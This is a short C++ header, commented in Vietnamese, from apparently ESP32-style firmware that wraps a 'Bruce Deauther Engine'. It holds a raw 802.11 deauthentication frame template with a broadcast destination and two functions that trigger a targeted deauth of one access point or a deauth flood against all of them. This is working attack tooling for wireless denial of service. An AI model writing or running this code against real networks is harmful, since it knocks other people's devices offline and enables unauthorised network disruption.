#pragma once

/*
 * deauth.hpp - Wrapper goi Bruce Deauther Engine
 * WiFi_Init() lay tu utils.hpp, khong dinh nghia lai o day
 */

#include "utils.hpp"
#include <vector>

// Frame template (giu lai de tuong thich)
static const uint8_t deauth_frame_template[] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

// WiFi_DeauthAP → Bruce_DeauthAll
void WiFi_DeauthAP(const uint8_t* bssid, String ap_name, uint8_t chan = 1)
{
    extern void Bruce_DeauthAll(const uint8_t*, uint8_t, const char*);
    Bruce_DeauthAll(bssid, chan, ap_name.c_str());
}

// WiFi_DeauthAll → Bruce_DeauthFlood
void WiFi_DeauthAll(const std::vector<APRecord>& aps)
{
    extern void Bruce_DeauthFlood();
    Bruce_DeauthFlood();
}
